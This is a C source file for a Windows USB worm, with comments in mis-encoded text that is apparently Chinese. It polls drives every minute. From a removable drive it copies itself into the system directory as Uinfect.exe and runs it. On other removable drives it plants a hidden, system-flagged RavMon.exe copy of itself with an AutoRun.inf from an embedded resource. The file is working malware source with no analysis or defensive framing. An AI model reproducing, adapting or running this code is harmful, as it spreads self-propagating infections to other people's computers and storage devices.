#include<windows.h>
#include<string.h>

BOOL UDevice();

void ResourceToFile(char  *filename,char *Name,char* Type);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     LPSTR lpCmdLine, int nShowCmd)
 {
     UDevice();
    return 0;
 }

 BOOL UDevice()
 {

     while(1)
     {
         char Name[256]="H:\\";
         char szName[256];
         char ToPath[256];
         char infPath[256];
         char OpenUDevice[79]; 

         UINT retType;

         memset(szName, 0, 256);
         memset(ToPath, 0, 256);
         memset(infPath, 0, 256);
         memset(OpenUDevice, 0, 79);

     //do
     //{
     //}while()

     //�����̷�
         unsigned char i = 0x42;
         for(; i < 0x5B; i += 0x1)
         {
           Name[0] = i;
           retType = GetDriveType(Name);
           //�ж��Ƿ��ǿ��ƶ��洢�豸
           if(retType == DRIVE_REMOVABLE)
           {
                //�õ������ļ�·��
                GetModuleFileName(NULL, szName, 256);
                //�Ƚ��Ƿ��U�̵��̷���ͬ
                if(strncmp(Name, szName, 1) == 0)
                {
                    //�õ�ϵͳĿ¼
                   GetSystemDirectory(ToPath, 256);
                   strcat(ToPath,"\\Uinfect.exe");
                   //�������ļ����Ƶ�ϵͳĿ¼
                   if(CopyFile(szName, ToPath, TRUE))
                   {
                       WinExec(ToPath, 0);//���г���
                   }

                   strcpy(OpenUDevice, "explorer ");
                   strcat(OpenUDevice, Name);

                   //��U��
                   WinExec(OpenUDevice,1);
                   return 0;   
                }
                else
                {
                    strcpy(ToPath, Name);
                    strcat(ToPath,"\\RavMon.exe");
                    strcpy(infPath,Name);
                    strcat(infPath,"\\AutoRun.inf");

                    //��ԭU���ϵ��ļ�����
                    SetFileAttributes(ToPath,FILE_ATTRIBUTE_NORMAL);
                    SetFileAttributes(infPath,FILE_ATTRIBUTE_NORMAL);
                    //ɾ��ԭ���ļ�
                    DeleteFile(ToPath);
                    DeleteFile(infPath);
                    //�ͷ�AutoRun.inf��U��
                    ResourceToFile(infPath, (char*)0x64, (char*)256);
                    //���������ļ���U��
                    CopyFile(szName,ToPath,FALSE);

                    //���������ļ����ó�ϵͳ����������

                    //�����Ҳ���MSDN  ��Ϊ�ڶ��������ĺ�������˻�λ���㣬�����Ƶ��궨���е��鷳
                    SetFileAttributes(ToPath, 0x6);
                    SetFileAttributes(infPath, 0x6);
                }
           }
         }
         //һ���Ӽ��һ��U��
         Sleep(60000);
     }

 }

void ResourceToFile(char  *filename,char *Name,char* Type)
{   

    //Ѱ����������е���Դ
    HRSRC hRes = FindResource(NULL,Name,Type);
    if(hRes==NULL)
        return;
    //������Դ
    HGLOBAL hgRes = LoadResource(NULL, hRes);
    if(hgRes==NULL)
        return;
    //������Դ
    void *pRes = LockResource(hgRes);
    if(pRes==NULL)
        return;
    //�õ���Դ�ֽ���
    DWORD size = SizeofResource(NULL, hRes);
    if(size==0)
        return;
    //�����ļ�
    HANDLE hFile = CreateFile(filename, 0x40000000, 0, 0,
                     CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, 0);
    if(hFile==INVALID_HANDLE_VALUE)
        return;
    DWORD dwWrite;
    //����Դд�뵽�ļ�
    if(!WriteFile(hFile, pRes, size, &dwWrite, 0))
        return;
    //�ر��ļ����
    CloseHandle(hFile);
    //�ͷ���Դ
    GlobalFree(hgRes);
}